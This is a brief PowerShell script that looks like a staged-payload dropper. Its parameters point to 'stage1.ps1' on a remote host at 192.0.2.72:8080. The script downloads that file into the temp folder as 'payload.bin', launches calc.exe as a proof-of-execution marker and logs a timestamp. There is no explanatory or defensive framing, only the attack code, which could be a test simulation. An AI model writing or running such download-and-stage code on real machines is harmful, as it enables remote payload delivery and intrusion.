
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://192.0.2.72:8080/stage1.ps1",
    [string]$Stage2Path = "$env:TEMP\payload.bin",
    [int]$StageTimeout = 125
)
Invoke-WebRequest -Uri $TransferUrl -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
